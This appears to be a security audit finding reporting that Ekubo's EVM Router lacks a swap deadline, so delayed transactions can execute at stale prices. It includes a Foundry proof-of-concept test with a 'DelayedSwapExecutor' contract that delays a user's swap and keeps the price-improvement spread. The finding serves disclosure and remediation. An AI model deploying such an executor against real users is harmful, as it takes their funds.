  "body": "- **Description:** Ekubo’s Router forwards swaps to CORE.swap without reading a deadline or timestamp. SwapParameters contains no expiry value either. Once a user signs a swap transaction it remains valid indefinitely; if it lingers in the mempool and the market moves, the router can still execute it later at the stale price, violating the user’s intent. (The Starknet implementation of Ekubo already implements deadlines; the EVM router should do the same.)\n\n\n- **Impact:** A swap broadcast at price P can be mined much later at price P′. The router only checks the old price limit, so the user might miss large gains or incur unexpected losses even though they never re-signed the transaction.\n\n\n- **Recommendation:** Add a mandatory deadline parameter to every router entry point (single-hop, multihop, and multi-multihop). Reject swaps mined after that timestamp to align with users’ expectations and the Starknet implementation.",
  "proof_of_concept": "```solodity\n// SPDX-License-Identifier: ekubo-license-v1.eth\npragma solidity >=0.8.30;\n\nimport {FullTest} from \"./FullTest.sol\";\nimport {Router} from \"../src/Router.sol\";\nimport {PoolKey} from \"../src/types/poolKey.sol\";\nimport {SqrtRatio, MIN_SQRT_RATIO} from \"../src/types/sqrtRatio.sol\";\nimport {PoolBalanceUpdate} from \"../src/types/poolBalanceUpdate.sol\";\nimport {IERC20} from \"forge-std/interfaces/IERC20.sol\";\nimport {MIN_TICK, MAX_TICK} from \"../src/math/constants.sol\";\nimport {FixedPointMathLib} from \"solady/utils/FixedPointMathLib.sol\";\nimport {console2} from \"forge-std/console2.sol\";\nimport {CoreLib} from \"../src/libraries/CoreLib.sol\";\n\n/// @notice User's transaction is pending in the mempool and might be executed at the wrong market price\n/// and only forwards the victim's minimum amount out\ncontract DelayedSwapExecutor {\n    Router private immutable router;\n\n    struct PendingOrder {\n        PoolKey poolKey;\n        bool isToken1;\n        int128 amount;\n        SqrtRatio sqrtRatioLimit;\n        uint128 minAmountOut;\n        address victim;\n        bool exists;\n    }\n\n    PendingOrder public order;\n\n    constructor(Router _router) {\n        router = _router;\n    }\n\n    function queueOrder(\n        PoolKey memory poolKey,\n        bool isToken1,\n        int128 amount,\n        SqrtRatio sqrtRatioLimit,\n        uint128 minAmountOut\n    ) external {\n        require(!order.exists, \"pending order\");\n        require(amount > 0, \"exact in only\");\n        require(minAmountOut > 0, \"min out zero\");\n\n        order.poolKey = poolKey;\n        order.isToken1 = isToken1;\n        order.amount = amount;\n        order.sqrtRatioLimit = sqrtRatioLimit;\n        order.minAmountOut = minAmountOut;\n        order.victim = msg.sender;\n        order.exists = true;\n\n        address tokenIn = isToken1 ? poolKey.token1 : poolKey.token0;\n        uint128 amountUnsigned = uint128(uint256(int256(amount)));\n        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountUnsigned);\n        IERC20(tokenIn).approve(address(router), type(uint256).max);\n    }\n\n    function executeOrder() external returns (uint256 actualOut) {\n        require(order.exists, \"no order\");\n\n        PoolBalanceUpdate balanceUpdate = router.swap(\n            order.poolKey,\n            order.isToken1,\n            order.amount,\n            order.sqrtRatioLimit,\n            0,\n            int256(uint256(order.minAmountOut)),\n            address(this)\n        );\n\n        address tokenOut = order.isToken1 ? order.poolKey.token0 : order.poolKey.token1;\n        int128 delta = order.isToken1 ? balanceUpdate.delta0() : balanceUpdate.delta1();\n        actualOut = uint128(uint256(int256(-delta)));\n\n        IERC20(tokenOut).transfer(order.victim, order.minAmountOut);\n        order.exists = false;\n    }\n}\n\ncontract NoDeadlinePoCTest is FullTest {\n    using CoreLib for *;\n    DelayedSwapExecutor executor;\n    address user = makeAddr(\"user\");\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n\n    function setUp() public override {\n        FullTest.setUp();\n        executor = new DelayedSwapExecutor(router);\n    }\n\n\n    function test_userWithPendingSwapMissesPriceImprovement() public {\n        PoolKey memory poolKey = createFullRangePool(0, 0);\n        createPosition(poolKey, MIN_TICK, MAX_TICK, 1_000 ether, 1_000_000 ether);\n\n        uint128 amountIn = 1 ether;\n        uint128 minAmountOut = 995 ether;\n\n        uint256 priceBefore = _spotPriceWad(poolKey);\n\n        vm.warp(block.timestamp + 1); // set a baseline so the jump is visible in logs\n        token0.transfer(alice, amountIn);\n        vm.startPrank(alice);\n        token0.approve(address(executor), amountIn);\n        executor.queueOrder(poolKey, false, int128(uint128(amountIn)), SqrtRatio.wrap(0), minAmountOut);\n        vm.stopPrank();\n\n        uint256 orderCreationTimestamp = block.timestamp;\n        uint256 executionTimestamp = orderCreationTimestamp + 86400; // +1 day\n        uint256 orderCreationTimestampForLog = orderCreationTimestamp;\n        uint256 executionTimestampForLog = executionTimestamp;\n        console2.log(\"Timestamp before warp\", orderCreationTimestampForLog);\n        console2.log(\"Warp target\", executionTimestampForLog);\n        vm.warp(executionTimestamp); // order sits pending for 1 day\n        console2.log(\"Timestamp after warp\", block.timestamp);\n\n        // Move price so token0 is worth more (1 -> 2 in the scenario)\n        uint128 manipulation = 500_000 ether;\n        token1.approve(address(router), manipulation);\n        router.swap(poolKey, true, int128(uint128(manipulation)), SqrtRatio.wrap(0), 0, type(int256).min, address(this));\n\n        uint256 priceAfter = _spotPriceWad(poolKey);\n\n        // Bob swaps after the price move and gets the better rate\n        token0.transfer(bob, amountIn);\n        vm.startPrank(bob);\n        token0.approve(address(router), amountIn);\n        PoolBalanceUpdate bobSwap =\n            router.swap(poolKey, false, int128(uint128(amountIn)), SqrtRatio.wrap(0), 0, type(int256).min, bob);\n        vm.stopPrank();\n        uint256 bobOut = uint128(uint256(int256(-bobSwap.delta1())));\n\n        // Alice's pending order executes at only her minAmountOut\n        uint256 actualOut = executor.executeOrder();\n        uint256 aliceOut = token1.balanceOf(alice);\n        uint256 executorProfit = token1.balanceOf(address(executor));\n\n        uint256 profitFromBob = bobOut - aliceOut;\n\n        assertGt(priceAfter, priceBefore, \"price should improve for token0\");\n        assertEq(aliceOut, minAmountOut, \"alice only gets her minimum\");\n        assertGt(actualOut, minAmountOut, \"pool would pay more after price move\");\n        assertGt(bobOut, aliceOut, \"bob captures better price than pending order\");\n        assertEq(executorProfit, actualOut - minAmountOut, \"executor keeps the spread\");\n        console2.log(\"Price before %e\", priceBefore);\n        console2.log(\"Price after %e\", priceAfter);\n        console2.log(\"Alice receives %e\", aliceOut);\n        console2.log(\"Bob receives %e\", bobOut);\n        console2.log(\"Bob - Alice %e\", profitFromBob);\n        // console2.log(\"Executor profit %e\", executorProfit);\n\n    }\n\n    function _spotPriceWad(PoolKey memory poolKey) internal returns (uint256) {\n        (PoolBalanceUpdate balanceUpdate,) = router.quote({\n            poolKey: poolKey,\n            isToken1: false,\n            amount: int128(int256(1 ether)),\n            sqrtRatioLimit: MIN_SQRT_RATIO,\n            skipAhead: 0\n        });\n\n        int128 delta0 = balanceUpdate.delta0();\n        int128 delta1 = balanceUpdate.delta1();\n        require(delta0 > 0 && delta1 < 0, \"unexpected quote deltas\");\n\n        uint256 amount0 = uint256(uint128(uint256(int256(delta0))));\n        uint256 amount1 = uint256(uint128(uint256(int256(-delta1))));\n        return FixedPointMathLib.mulDiv(amount1, 1e18, amount0);\n    }\n}\n```",
